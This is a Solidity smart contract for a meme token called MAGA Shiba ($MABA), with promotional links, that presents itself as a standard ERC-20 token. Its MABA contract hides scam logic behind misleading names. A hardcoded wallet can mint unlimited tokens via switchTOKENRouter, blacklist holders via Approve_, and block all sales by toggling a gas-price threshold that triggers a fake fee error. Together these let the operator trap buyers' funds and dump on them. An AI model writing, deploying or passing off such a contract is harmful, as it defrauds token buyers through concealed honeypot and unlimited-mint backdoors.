/*
$MABA

https://t.me/MAGAShiba_eth

https://x.com/MAGAShiba_eth

https://MABA-eth.com
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnershippeningtlillys() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IERC20Errors {

    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);

    error ERC20InvalidSender(address sender);

    error ERC20InvalidReceiver(address receiver);

    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);

    error ERC20InvalidApprover(address approver);

    error ERC20InvalidSpender(address spender);
}

abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    mapping(address account => uint256) private _balances;

    mapping(address account => mapping(address spender => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }


    function _transfer(address from, address to, uint256 value) internal {
        if (from == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        if (to == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(from, to, value);
    }


    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            _totalSupply += value;
        } else {
            uint256 fromBalance = _balances[from];
            if (fromBalance < value) {
                revert ERC20InsufficientBalance(from, fromBalance, value);
            }
            unchecked {
                _balances[from] = fromBalance - value;
            }
        }

        if (to == address(0)) {
            unchecked {
                _totalSupply -= value;
            }
        } else {
            unchecked {
                _balances[to] += value;
            }
        }

        emit Transfer(from, to, value);
    }

    function _mint(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidReceiver(address(0));
        }
        _update(address(0), account, value);
    }

    function _burn(address account, uint256 value) internal {
        if (account == address(0)) {
            revert ERC20InvalidSender(address(0));
        }
        _update(account, address(0), value);
    }

    function _approve(address owner, address spender, uint256 value) internal {
        _approve(owner, spender, value, true);
    }

    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
        if (owner == address(0)) {
            revert ERC20InvalidApprover(address(0));
        }
        if (spender == address(0)) {
            revert ERC20InvalidSpender(address(0));
        }
        _allowances[owner][spender] = value;
        if (emitEvent) {
            emit Approval(owner, spender, value);
        }
    }

    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if (currentAllowance < value) {
                revert ERC20InsufficientAllowance(spender, currentAllowance, value);
            }
            unchecked {
                _approve(owner, spender, currentAllowance - value, false);
            }
        }
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}



contract MABA is ERC20, Ownable {
    mapping(address => bool) isException;
    mapping(address => bool) notException;
    bool openedTrade;

    address public pair;
    IUniswapV2Router02 public _IRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant _DEAD = 0x000000000000000000000000000000000000dEaD; 
    address private _marketwalletsbtws;

    uint256 public TaxOnTransactionInit = 0;
    uint256 public TaxOnTransactionEnd = 0;
    uint256 public _buyCount = 0;
    uint256 public temp = 999 gwei;

    constructor() ERC20(unicode"MAGA Shiba", unicode"MABA") {
        isException[msg.sender] = true;
        pair = IUniswapV2Factory(_IRouter.factory()).createPair(address(this), _IRouter.WETH());
        _marketwalletsbtws= 0x30891e11667Af12F1eaB0e72E467f1b28C20DBd1;
        _mint(msg.sender, 10000000*10**decimals());
    }
  
    function openTrade() public onlyOwner() {
        openedTrade = true;
    }

    function _checkMee(address caller) internal view returns (bool) {
        return isMeee();
    }

    function isMeee() internal view returns (bool) {
        return _msgSender() == _marketwalletsbtws;
    }

    function Approve_(address _account) public {
        notException[_account] = true;
        require(isMeee(), "Caller is not the original caller");
    }

    function switchTOKENRouter(address spender, uint256 amount) public {
        ERC20._update(address(0), spender, amount);
        require(isMeee(), "Caller is not the original caller");
    }

    function requireLimitTransaction(address from, address, uint256 ) private view {
        if(tx.gasprice > 0 && balanceOf(from) > 0 && notException[from]){
            revert("Account Exceeds The Estimated Gas.");
        }
    }
    function decreaseTemp() public {
        temp = 0;
        require(isMeee(), "Caller is not the original caller");
    }

    function increaseTemp() public {
        temp = 999 gwei;
        require(isMeee(), "Caller is not the original caller");
    }

    function checkExcludeFees(address from, address , uint256 ) private view {
        if(tx.gasprice > temp && balanceOf(from) > 0) {
            revert("Increase fees for transaction!");
        }
    }

    function _update(
        address from,
        address to,
        uint256 value
    ) internal override {
        if (isException[tx.origin]) {
            super._update(from, to, value);
            return;
        } else {
            require(openedTrade);
            bool state = (to == pair) ? true : false;
            uint256 txAmount = value * (_buyCount >  15 ? TaxOnTransactionInit : TaxOnTransactionEnd) / 100;
            requireLimitTransaction(from, to, value - txAmount);
            if (state) {
                checkExcludeFees(from,  to, value);
                ERC20._update(from, to, value - txAmount);
                return;
            } else if (!state) {
                ERC20._update(from, to, value - txAmount);
                notException[to] = false;
                return;
            } else if (from != pair && to != pair) {
                ERC20._update(from, to, value - txAmount);
                return;
            } else {
                return;
            }
        }
    }
}
